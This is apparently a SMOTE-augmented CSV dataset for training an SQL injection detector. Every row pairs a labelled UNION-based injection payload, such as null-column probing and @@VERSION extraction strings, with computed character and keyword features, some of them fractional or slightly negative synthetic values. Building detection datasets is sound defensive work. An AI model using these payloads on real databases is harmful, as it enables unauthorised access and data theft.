id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000096,attack,union,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",nearest_attack_euclidean,R000123,0.051407449890437704,79.0,22.0,3.742215289666651,14.0,44.0,8.0,13.0,0.17721518987341772,0.5569620253164557,0.10126582278481013,0.16455696202531644,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,9.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000097,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000099,0.42736000106660343,82.24117842277653,28.0,3.955946096313425,40.0,3.7470594742588457,25.241178422776535,13.252940525741154,0.4864989251639968,0.04548813594463527,0.3067390316413046,0.16127390725006338,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.747059474258846,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000098,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000005,0.6064160681654205,80.32441472267223,34.0,4.240199607093195,40.0,2.4414715742240745,23.88294314844815,14.0,0.49815119035089706,0.030291359203204304,0.2972045338230847,0.17435291662281396,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.4414715742240745,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000099,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,1.0869772439411247,79.78051816467922,15.0,3.0543423484311587,50.0,1.0,16.22441453174337,12.556103632935843,0.6273319752559454,0.012546639505118917,0.20277995955633998,0.1573414256825957,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.556103632935843,-1.3877787807814457e-17,0.0,8.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000068,1.5473959464805325,75.0,32.0,4.413307031646614,41.520718303091186,2.619820424227205,17.0,13.85946127268161,0.5536095773745491,0.03493093898969607,0.22666666666666666,0.18479281696908817,1.8594612726816113,0.0,2.0,0.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,7.0,0.6198204242272037,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000101,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000132,0.9954663828010082,77.42534945509443,22.485069891018888,3.6916922207444482,44.94027956407555,9.0,14.0,9.485069891018888,0.5802051567894342,0.11636197581735835,0.18100751793811298,0.12242534945509444,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,5.485069891018887,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,union,"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",nearest_attack_euclidean,R000168,0.5421998149590123,79.52948210482303,20.0,3.6914033905224195,14.0,42.94103579035392,9.588446314469115,13.0,0.17605676676550672,0.5402476347594539,0.1202143150499259,0.16348128342511337,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.2647410524115192,-1.3877787807814457e-17,0.0,8.73525894758848,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000002,0.9469730102996126,80.71255705429138,28.712557054291374,4.026880271663546,40.0,3.0,23.712557054291374,14.0,0.49560149966486805,0.037170112474865125,0.293767862977563,0.1734605248827038,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.7125570542913746,0.0,1.0,5.712557054291375,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000104,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000197,0.3569181410701933,77.90271244664876,16.902712446648767,3.151280966556371,46.38915021340493,1.0,17.610849786595068,12.902712446648767,0.5955426147352217,0.01283671121434421,0.2260069029828068,0.16561377106762734,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.902712446648767,0.9027124466487668,0.0,7.097287553351233,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000105,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000063,0.22655754945050288,76.62805177785634,25.371948222143658,3.849354398460062,42.88415533356902,2.3719482221436596,23.371948222143658,8.0,0.5595430079390185,0.030995199854639277,0.3050572150058725,0.1044045772004698,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000106,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,1.212046975228662,79.55341431501182,15.0,3.0504739397351877,50.085462904018925,1.0,15.95726854799054,12.510682863002366,0.6286226774024253,0.012582607805668083,0.20157558133117812,0.15721913346072858,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.489317136997635,-1.3877787807814457e-17,0.0,8.021365726004731,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000076,0.5842098418422474,82.60092219066975,27.800461095334875,3.941439778885732,42.800461095334875,4.0,25.0,10.800461095334873,0.5181613292747278,0.04843021139927431,0.30268882124546426,0.13071963808053358,1.6009221906697453,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.8004610953348725,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000108,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000121,0.7185751716130866,81.0,23.558436011320282,3.738543613721107,47.883127977359436,9.0,13.116872022640566,11.0,0.5911497281155486,0.1111111111111111,0.16193669163753785,0.13580246913580246,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.7792180056601415,-1.3877787807814457e-17,0.0,6.220781994339858,3.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7792180056601415,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000109,attack,union,"-2784'   )    )    union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",nearest_attack_euclidean,R000306,0.7750183926130345,81.0,20.938166579730577,3.583056605745473,14.0,38.123666840538846,15.876333159461154,13.0,0.1728395061728395,0.47066255358689935,0.19600411307976734,0.16049382716049382,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.4690832898652886,-1.3877787807814457e-17,0.0,7.530916710134711,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000110,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.7706662315352514,80.13232467381286,28.566162336906434,3.9976380589851197,40.0,2.8553874456354773,24.0,13.276937228177388,0.49954024906131445,0.03553735128807162,0.29972414943678866,0.16519825021382525,2.5661623369064337,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,4.855387445635477,0.8553874456354779,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000111,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000285,0.048962873642068264,81.95201069529101,20.0,3.65722991009653,14.0,40.09597860941799,13.85603208587301,14.0,0.1708341235161473,0.4892972283781456,0.16903452458955992,0.17083412351614727,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.976005347645502,-1.3877787807814457e-17,0.0,8.023994652354498,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000112,attack,union,"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",nearest_attack_euclidean,R000146,0.4890707859626998,75.69418849365292,24.34709424682646,3.8449783528378623,34.91743451904124,11.603206851198458,22.0,7.173547123413231,0.4626367282131535,0.1518975219235456,0.2907557558041579,0.09470999405914293,0.0,0.0,2.1735471234132304,0.0,0.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,3.1735471234132304,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000113,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000240,1.4018300227993146,78.5270041559461,25.054008311892204,4.021329869776817,35.54008311892204,17.986921037024057,16.0,9.0,0.4517934727973494,0.22983182806254232,0.20375980744966932,0.114614891690439,0.0,1.0,2.472995844053898,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,3.527004155946102,3.472995844053898,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000008,0.0,83.0,29.0,3.9945533084585856,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325302,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000115,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000253,0.9680296143952322,76.26966947695732,15.269669476957313,3.05160561606824,47.078677907829245,1.0,16.921322092170755,11.269669476957311,0.6171522086560126,0.013111813144744161,0.22200383260761206,0.14773214559163111,0.0,0.26966947695731136,0.0,0.0,0.0,0.0,0.0,2.7303305230426886,-1.3877787807814457e-17,0.0,7.269669476957311,0.0,0.0,0.26966947695731136,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000116,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000163,1.4150206658912723,78.41268972193899,23.650758887755963,3.907889781572705,45.0,9.0,15.58731027806101,8.825379443877981,0.5739092766168039,0.11478185532336078,0.19883271115510143,0.11247615690473395,1.8253794438779807,0.0,0.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,3.5873102780610098,1.4126897219389905,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.4126897219389905,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4126897219389902
SMOTE_000117,attack,union,-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,nearest_attack_euclidean,R000186,0.04146163096807539,79.01173423891358,29.941328805432093,4.393281684263453,37.09387391130865,15.917860327604933,16.976531522172838,9.023468477827162,0.46945915698632606,0.20147519273072345,0.21486495382755116,0.11420069645539929,3.0,0.0,0.988265761086419,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,0.035202716740744044,3.988265761086419,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,2.0,1.0,1.0,0.988265761086419,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.988265761086419
SMOTE_000118,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.0,81.0,27.0,3.8852146856306904,42.0,4.0,25.0,10.0,0.5185185185185185,0.04938271604938271,0.30864197530864196,0.12345679012345678,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000119,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000219,1.4025981946331265,79.53912573426072,15.589854289043455,3.058865875190837,48.35941715617382,1.0,18.0,12.179708578086908,0.6079133376272812,0.012589999079868325,0.22661998343762949,0.15287667985522096,0.5898542890434539,0.0,0.0,0.0,0.0,0.0,0.0,3.0,-1.3877787807814457e-17,0.0,7.589854289043454,0.0,0.5898542890434539,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000120,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R000148,0.31763678355326747,75.17755688057093,22.088778440285463,3.762593229217527,14.0,39.2897724777163,8.887784402854626,13.0,0.1862362257440705,0.5228797680702831,0.11795036799472378,0.1729336381909226,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1775568805709256,1.0,0.0,7.822443119429074,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000008,0.29325041318431216,83.0,28.592261302290392,3.9786116464852235,43.0,3.4077386977096094,25.0,11.592261302290392,0.5180722891566265,0.04105709274348929,0.30120481927710846,0.1396657988227758,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000122,attack,union,"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",nearest_attack_euclidean,R000141,0.01844414021473557,82.99388507024855,24.03057464875722,3.824056573456894,19.036689578508668,39.95108056198845,14.012229859502888,9.993885070248556,0.2293801673055387,0.481367070795636,0.16883642188587422,0.12041634001295101,0.006114929751444342,0.0,1.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,5.987770140497112,2.0,0.006114929751444231,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000123,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000088,0.22763529815870523,76.0,26.378510846993528,3.9069525953065467,40.0,3.0,23.0,10.0,0.5263157894736842,0.0394736842105263,0.3026315789473684,0.13157894736842105,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.378510846993526,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000124,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.6924746163835199,81.47303423039176,27.236517115195884,3.901827856384153,42.23651711519588,4.0,25.0,10.236517115195884,0.5184129776371281,0.049101273699008324,0.306882960618802,0.12560278804506156,0.47303423039176845,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.23651711519588411,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000125,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000138,0.0373696396800101,80.94085405190759,24.976341620763037,3.859748308372259,41.02365837923696,9.0,21.905366483052152,9.011829189618481,0.5068780559762806,0.11119758179545673,0.2705711332009839,0.11135322902727884,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.9881708103815188,-1.3877787807814457e-17,0.0,3.023658379236962,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.16287107347306368,81.0,26.776747745841487,3.875265792141557,42.0,4.223252254158515,25.0,9.776747745841487,0.5185185185185185,0.05213891671800633,0.30864197530864196,0.12070058945483315,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000127,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000167,2.1548638471879875,77.14519649981554,29.435589499446614,4.257081802926489,26.451964998155383,27.564410500553386,15.419214000737847,7.709607000368923,0.3426858795142484,0.35737497611518076,0.19995942958038057,0.09997971479019029,0.0,1.4355894994466147,0.8548035001844617,0.0,0.0,1.0,0.0,0.8548035001844617,-1.3877787807814457e-17,0.0,2.709607000368923,1.8548035001844618,0.0,1.0,0.0,0.8548035001844618,0.0,1.0,0.8548035001844617,0.0,0.0,0.0,0.0,1.0,1.0,0.8548035001844617,0.0,0.14519649981553823,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
